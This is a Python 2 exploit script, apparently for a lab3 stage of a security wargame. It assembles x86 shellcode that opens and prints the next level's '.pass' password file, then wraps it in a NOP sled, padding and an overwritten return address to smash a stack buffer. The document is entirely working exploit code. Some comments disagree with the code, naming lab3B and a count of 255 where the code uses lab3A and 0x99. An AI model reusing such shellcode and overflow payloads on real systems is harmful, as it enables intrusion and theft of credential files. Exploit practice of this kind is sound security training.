#! /usr/bin/env python

from pwnlib.asm import asm

# buf = bffff660
EIP = "\x20\xf6\xff\xbf"
#EIP = "BBBB"

SHELLASM = """
xor ecx, ecx;
push ecx;
push 0x73736170;
push 0x2e2f2f2f;
push 0x2f413362;
push 0x616c2f65;
push 0x6d6f682f;
mov ebx, esp;
mul ecx;
add al, 5;
int 0x80;
mov ebx, eax;
mov ecx, esp;
add dl, 0x99;
int 0x80;
sub bl, 2;
mov edx, eax;
xor eax, eax;
add al, 4;
int 0x80;
xor eax, eax;
inc al;
int 0x80
"""

# ecx = 0;
# push ecx; '\0'
# push "ssap"
# push ".///"
# push "/A3b"
# push "al/e"
# push "moh/"
# mov ebx, esp; # ebx = "/home/lab3A////.pass"
# edx:eax = eax * ecx; # eax = edx = 0
# eax = 5
# open( "/home/lab3B////.pass", 0, 0)
# ebx = eax (file descriptor - always 3)
# ecx = esp (our new buffer that we're just gonna smash)
# count = 0x99
# read( 3, esp, 255)
# ebx = 1 (stdout)
# edx = # of bytes read from read()
# eax = 4
# write( stdout, *buf, len(read))
# eax = 1
# exit() 

SHELLCODE = asm(SHELLASM)

#print "SHELLCODE\n" + SHELLCODE + "\n"
#print len(SHELLCODE)

print '\x90' * 50 + SHELLCODE + '\x90' * (106-len(SHELLCODE)) + EIP